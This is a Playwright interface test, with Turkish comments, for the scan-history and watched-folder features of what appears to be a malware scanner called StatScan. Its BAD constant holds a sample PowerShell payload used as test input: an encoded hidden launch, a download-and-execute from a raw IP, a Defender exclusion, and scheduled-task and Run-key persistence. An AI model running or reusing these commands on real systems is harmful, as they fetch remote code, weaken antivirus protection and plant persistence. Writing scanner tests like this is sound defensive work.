// Tarama Geçmişi + klasör izleme tekrar-bildirim düzeltmesi arayüz testi (Playwright). Arayüz GERÇEK host koduna (createHost) köprüyle bağlanır;
// bildirim sahte (Electron yok), klasör izleme gerçek dosya sistemiyle çalışır. Kontrol: sekme, boş durum, elle tarama kaydı, süzgeç/arama/ayrıntı, temizleme,
// izlenen klasörde AYNI içerik (mtime değişse bile) yeniden taranmaz ve ikinci kez bildirilmez, EN, tarayıcı yedeği (localStorage), 390 px, klavye.
import { createRequire } from 'node:module'; const require = createRequire('/home/claude/.npm-global/lib/node_modules/'); const { chromium } = require('playwright');
import fs from 'node:fs'; import os from 'node:os'; import path from 'node:path'; import { pathToFileURL, fileURLToPath } from 'node:url';
const { createHost } = createRequire(import.meta.url)('../../app/desktop/host.js');
const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../..'); const URL = pathToFileURL(path.join(ROOT, 'app/StatScan.html')).href + '#/statscan';
let bad = 0; const ok = (c, m) => { console.log((c ? 'OK   ' : 'FAIL ') + m); if (!c) bad++; };
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'kovan-uihist-')); const SHOT = process.env.SHOT; if (SHOT) fs.mkdirSync(SHOT, { recursive: true });
const BAD = 'powershell -nop -w hidden -enc SQBFAFgA\nInvoke-Expression (New-Object Net.WebClient).DownloadString("http://1.2.3.4/x.ps1")\nAdd-MpPreference -ExclusionPath C:\\\nschtasks /create /tn x /tr evil.exe /sc onlogon\nreg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d evil.exe\n';
/* preload.js'ten kanal eşlemesi: ad -> kanal (argümanlar olduğu gibi geçer) */
const MAP = {}; for (const m of fs.readFileSync(path.join(ROOT, 'app/desktop/preload.js'), 'utf8').matchAll(/^\s+(\w+): \([^)]*\) => call\('([^']+)'/gm)) MAP[m[1]] = m[2];
ok(MAP.historyList === 'history:list' && MAP.historyAdd === 'history:add' && MAP.historyClear === 'history:clear' && MAP.watchTake === 'watch:take', 'preload geçmiş kanallarını sunar');
const b = await chromium.launch({ executablePath: '/opt/pw-browsers/chromium', args: ['--no-sandbox'] });
async function page(host, { vp = { width: 1366, height: 900 }, en = false } = {}) {
  const ctx = await b.newContext({ viewport: vp, reducedMotion: 'reduce', acceptDownloads: true }); const pg = await ctx.newPage(); pg.errs = []; pg.on('pageerror', (e) => pg.errs.push(e.message + ' @ ' + String(e.stack || '').split('\n').slice(1, 3).join(' ; '))); pg.on('console', (m) => { if (m.type() === 'error') pg.errs.push('console: ' + m.text()); });
  await pg.addInitScript((e) => { try { if (e) localStorage.setItem('kovan.lang', 'en'); localStorage.setItem('kovan.fx', '0'); } catch (x) { /* yok */ } }, en);
  if (host) {
    /* gerçek IPC Uint8Array'i korur; JSON köprüsü korumaz -> base64 ile taşı */
    await pg.exposeFunction('__h', async (ch, ...a) => { const f = host.handlers[ch]; return f ? JSON.parse(JSON.stringify(await f(null, ...a), (k, v) => (ArrayBuffer.isView(v) ? { __u8: Buffer.from(v.buffer, v.byteOffset, v.byteLength).toString('base64') } : v)) || 'null') : { error: 'nochan' }; });
    await pg.addInitScript((map) => { const o = { desktop: true }; const rev = (r) => { if (r && r.item && r.item.bytes && r.item.bytes.__u8) r.item.bytes = Uint8Array.from(atob(r.item.bytes.__u8), (c) => c.charCodeAt(0)); return r; }; for (const [n, ch] of Object.entries(map)) o[n] = async (...a) => rev(await window.__h(ch, ...a)); window.statscanHost = Object.freeze(o); }, MAP);
  }
  await pg.goto(URL); await pg.waitForSelector('#tab-history', { state: 'attached' }); return pg;
}
const sel = (pg, s) => pg.evaluate((q) => { const e = document.querySelector(q); return e ? e.textContent : null; }, s);
const hidden = (pg, s) => pg.evaluate((q) => document.querySelector(q).hidden, s);
const overflowX = (pg) => pg.evaluate(() => document.documentElement.scrollWidth > document.documentElement.clientWidth + 1);

/* ---------- 1) masaüstü: gerçek host + izlenen klasör ---------- */
const dl = path.join(tmp, 'Downloads'); fs.mkdirSync(dl); const sent = []; const hp = path.join(tmp, 'ud', 'tarama-gecmisi.json'); const sp = path.join(tmp, 'ud', 'store.json');
const mkHost = () => createHost({ service: { closeAll() {}, status() { return { available: false, reasons: [{ title: 'test ortamı' }], defaults: {} }; } }, notify: (t, bd) => sent.push([t, bd]), historyPath: hp, storePath: sp, confirm: async () => true, downloadsDir: dl, obfOutputRoot: path.join(tmp, 'out'), watchTickMs: 40 });
let host = mkHost(); await host.handlers['store:set'](null, 'watch', JSON.stringify({ folders: [dl], enabled: true, threshold: 30 }));
let pg = await page(host);
ok(await pg.evaluate(() => [...document.querySelectorAll('.tabs [role=tab]')].map((x) => x.textContent).join() === 'Tarama,Geçmiş,Bilgi'), 'sekmeler: Tarama, Geçmiş, Bilgi');
ok(await hidden(pg, '#view-history'), 'Geçmiş görünümü başta gizli');
await pg.click('#tab-history'); await pg.waitForTimeout(150);
ok(!(await hidden(pg, '#view-history')) && (await hidden(pg, '#view-scan')) && (await pg.getAttribute('#tab-history', 'aria-selected')) === 'true', 'Geçmiş sekmesi açılır, tarama gizlenir');
ok(/Henüz tarama kaydı yok/.test(await sel(pg, '#hist-list')) && /0\s*kayıt/.test(await sel(pg, '#hist-sum')), 'boş durum yazısı ve 0 kayıt');
await pg.focus('#tab-history'); await pg.keyboard.press('ArrowRight'); ok((await pg.getAttribute('#tab-info', 'aria-selected')) === 'true', 'klavye: → ile sıradaki sekmeye (Bilgi) geçilir');
await pg.keyboard.press('ArrowLeft'); await pg.keyboard.press('ArrowLeft'); ok((await pg.getAttribute('#tab-scan', 'aria-selected')) === 'true', 'klavye: ← ile başa dönülür'); await pg.click('#tab-history');

/* izlenen klasöre şüpheli dosya düşer: bir kez taranır, bir kez bildirilir, geçmişe yazılır */
await sleep(300); fs.writeFileSync(path.join(dl, 'kotu.ps1'), BAD);
const waitFor = async (fn, ms = 12000) => { const t0 = Date.now(); while (Date.now() - t0 < ms) { if (await fn()) return true; await sleep(150); } return false; };
ok(await waitFor(() => sent.length >= 1), 'şüpheli dosya için bildirim gönderildi'); const n1 = sent.length;
ok(await waitFor(async () => /kotu\.ps1/.test(await sel(pg, '#hist-list')), 8000), 'dosya Geçmiş listesinde görünür (otomatik yenilenir)');
let l = (await host.handlers['history:list'](null, {})); ok(l.total === 1 && l.rows[0].src === 'watch' && l.rows[0].alert === true && l.rows[0].notified === true && l.rows[0].score === 100 && l.rows[0].count === 1, 'kayıt: klasör izleme, uyarı, bildirildi, skor 100, sayaç 1');
/* KÖK NEDEN SENARYOSU: dosyanın mtime'ı değişir (antivirüs / bulut eşitleme) — içerik aynı */
for (let i = 1; i <= 3; i++) { const t = new Date(Date.now() + i * 7000); fs.utimesSync(path.join(dl, 'kotu.ps1'), t, t); await sleep(3400); }
ok(sent.length === n1, 'mtime 3 kez değişti: İKİNCİ BİLDİRİM GELMEDİ (' + sent.length + ' toplam bildirim)');
l = await host.handlers['history:list'](null, {}); ok(l.total === 1 && l.rows[0].count >= 2, 'aynı içerik tek satırda kaldı, sayaç arttı (×' + l.rows[0].count + ')');
const wl = (await host.handlers['watch:log'](null)).log; ok(wl.some((x) => /daha önce taranmış/.test(x.text)) && wl.filter((x) => x.kind === 'alert').length === 1, 'günlükte "daha önce taranmış" var, UYARI yalnız bir kez');
/* uygulama yeniden başlar (yeni host + yeni sayfa, aynı veri dizini): hâlâ tekrar bildirim YOK */
await pg.context().close(); host.handlers['watch:set'] && await host.handlers['watch:set'](null, []); host = mkHost(); host.handlers['watch:set'] && 0; pg = await page(host);
const t2 = new Date(Date.now() + 40000); fs.utimesSync(path.join(dl, 'kotu.ps1'), t2, t2); await sleep(4200);
ok(sent.length === n1, 'uygulama yeniden başlatıldıktan sonra da aynı dosya için bildirim gelmedi'); ok((await host.handlers['history:list'](null, {})).total === 1, 'geçmiş yeniden başlatmada korunur');
/* yeni içerik (aynı ad) -> yeniden taranır ve bildirilir */
fs.writeFileSync(path.join(dl, 'kotu.ps1'), BAD + '# degisti\n'); ok(await waitFor(() => sent.length === n1 + 1, 12000), 'içerik gerçekten değişince yeniden taranır ve bildirilir');
/* zararsız dosya: bildirim yok ama geçmişte */
fs.writeFileSync(path.join(dl, 'temiz.txt'), 'merhaba dünya, zararsız metin'); ok(await waitFor(async () => (await host.handlers['history:list'](null, {})).total === 3, 10000) && sent.length === n1 + 1, 'zararsız dosya geçmişe yazılır, bildirim gönderilmez');

/* ---------- 2) elle tarama geçmişe yazılır; süzgeç, arama, ayrıntı, temizleme ---------- */
await pg.click('#tab-scan'); const man = path.join(tmp, 'elle.ps1'); fs.writeFileSync(man, BAD + '# elle\n');
await pg.setInputFiles('#file', man); ok(await waitFor(async () => (await host.handlers['history:list'](null, { filter: 'manual' })).matched === 1, 10000), 'elle taranan dosya geçmişe yazılır (kaynak: manual)');
await pg.click('#tab-history'); await pg.waitForTimeout(300);
ok(await pg.evaluate(() => document.querySelectorAll('#hist-list .hrow').length) === 4, 'listede 4 satır (3 izleme + 1 elle)');
ok(/4\s*kayıt/.test(await sel(pg, '#hist-sum')), 'özet: 4 kayıt');
await pg.selectOption('#hist-bar select', 'manual'); await pg.waitForTimeout(300); ok(await pg.evaluate(() => document.querySelectorAll('#hist-list .hrow').length) === 1 && /Elle tarama/.test(await sel(pg, '#hist-list')), 'süzgeç: Elle taranan');
await pg.selectOption('#hist-bar select', 'watch'); await pg.waitForTimeout(300); ok(await pg.evaluate(() => document.querySelectorAll('#hist-list .hrow').length) === 3, 'süzgeç: Klasör izleme');
await pg.selectOption('#hist-bar select', 'alert'); await pg.waitForTimeout(300); ok(await pg.evaluate(() => document.querySelectorAll('#hist-list .hrow').length) === 3 && !/temiz\.txt/.test(await sel(pg, '#hist-list')), 'süzgeç: şüpheli/uyarı (zararsız dosya yok)');
await pg.selectOption('#hist-bar select', 'all'); await pg.fill('#hist-bar input[type=search]', 'TEMIZ'); await pg.waitForTimeout(500); ok(await pg.evaluate(() => document.querySelectorAll('#hist-list .hrow').length) === 1 && /temiz\.txt/.test(await sel(pg, '#hist-list')), 'arama (büyük/küçük harf duyarsız)');
await pg.fill('#hist-bar input[type=search]', 'xyz-yok-xyz'); await pg.waitForTimeout(500); ok(/Bu süzgeçle kayıt yok/.test(await sel(pg, '#hist-list')), 'eşleşme yoksa açıklama');
await pg.fill('#hist-bar input[type=search]', ''); await pg.waitForTimeout(500);
await pg.click('#hist-list .hrow button'); await pg.waitForTimeout(150); const det = await sel(pg, '#hist-list .hdet'); ok(det && /SHA-256/.test(det) && /[0-9a-f]{64}/.test(det) && /İlk görülme/.test(det), 'Ayrıntı: tam SHA-256, ilk/son görülme');
ok((await pg.getAttribute('#hist-list .hrow button', 'aria-expanded')) === 'true', 'Ayrıntı düğmesi aria-expanded');
if (SHOT) await pg.screenshot({ path: path.join(SHOT, 'history-desktop.png') });
ok(!(await overflowX(pg)), '1366 px: yatay taşma yok');
await pg.click('#hist-bar button:last-child'); await pg.waitForTimeout(400); ok(/Henüz tarama kaydı yok/.test(await sel(pg, '#hist-list')) && (await host.handlers['history:list'](null, {})).total === 0, 'Geçmişi temizle (host onayıyla) listeyi boşaltır');
ok(pg.errs.length === 0, 'sayfa hatası yok' + (pg.errs.length ? ': ' + pg.errs.slice(0, 3).join(' | ') : ''));
await pg.context().close();

/* ---------- 3) EN dili seçiliyken ---------- */
host = mkHost(); await host.handlers['history:add'](null, { src: 'manual', name: 'sample.exe', size: 2048, sha256: 'b'.repeat(64), score: 55, verdict: 'Yüksek risk', alert: true, mode: 'deep', top: ['Finding one'] });
await host.handlers['history:add'](null, { src: 'watch', name: 'again.jar', dir: 'C:\\Downloads', size: 10, sha256: 'c'.repeat(64), score: 3, verdict: 'Düşük risk', notified: false }); await host.handlers['history:add'](null, { src: 'watch', name: 'again.jar', dir: 'C:\\Downloads', size: 10, sha256: 'c'.repeat(64), score: 3, verdict: 'Düşük risk' });
pg = await page(host, { en: true }); await pg.click('#tab-history'); await pg.waitForTimeout(300); await pg.click('#hist-list .hrow button'); await pg.waitForTimeout(150);
ok(await pg.evaluate(() => document.querySelectorAll('#hist-list .hrow').length) === 2 && /×2/.test(await sel(pg, '#hist-list')), 'EN dili açıkken de Geçmiş çalışır (StatScan paneli çeviri kökü değildir, Türkçe kalır); tekrar görülen içerik ×2');
ok(pg.errs.length === 0, 'EN: sayfa hatası yok' + (pg.errs.length ? ': ' + pg.errs.slice(0, 2).join(' | ') : '')); await pg.context().close();

/* ---------- 4) dar ekran + tarayıcı sürümü (host yok: localStorage yedeği) ---------- */
pg = await page(null, { vp: { width: 390, height: 800 } }); await pg.click('#tab-history'); await pg.waitForTimeout(200);
ok(/Tarayıcı sürümünde/.test(await sel(pg, '#hist-intro')), 'tarayıcı sürümü: yedek açıklaması'); ok(/Henüz tarama kaydı yok/.test(await sel(pg, '#hist-list')), 'tarayıcı sürümü: boş durum');
await pg.click('#tab-scan'); fs.writeFileSync(path.join(tmp, 'w1.txt'), 'bir'); fs.writeFileSync(path.join(tmp, 'w2.ps1'), BAD);
await pg.setInputFiles('#file', path.join(tmp, 'w2.ps1')); await pg.waitForSelector('#results .card', { timeout: 15000 }); await pg.click('#tab-history'); await pg.waitForTimeout(300);
ok(await pg.evaluate(() => document.querySelectorAll('#hist-list .hrow').length) === 1 && /w2\.ps1/.test(await sel(pg, '#hist-list')), 'tarayıcı sürümü: elle tarama localStorage geçmişine yazılır');
await pg.click('#tab-scan'); await pg.setInputFiles('#file', path.join(tmp, 'w2.ps1')); await pg.waitForTimeout(2500); await pg.click('#tab-history'); await pg.waitForTimeout(300);
ok(await pg.evaluate(() => document.querySelectorAll('#hist-list .hrow').length) === 1 && /×2/.test(await sel(pg, '#hist-list')), 'aynı dosya yeniden taranınca satır çoğalmaz, ×2 olur');
ok(!(await overflowX(pg)), '390 px: yatay taşma yok'); if (SHOT) await pg.screenshot({ path: path.join(SHOT, 'history-390.png') });
pg.on('dialog', (d) => d.accept()); await pg.click('#hist-bar button:last-child'); await pg.waitForTimeout(300); ok(/Henüz tarama kaydı yok/.test(await sel(pg, '#hist-list')), 'tarayıcı sürümü: temizleme');
ok(pg.errs.length === 0, 'tarayıcı sürümü: sayfa hatası yok' + (pg.errs.length ? ': ' + pg.errs.slice(0, 3).join(' | ') : ''));
await b.close(); fs.rmSync(tmp, { recursive: true, force: true });
console.log(bad ? 'BAŞARISIZ ' + bad : 'tüm testler geçti'); process.exit(bad ? 1 : 0);
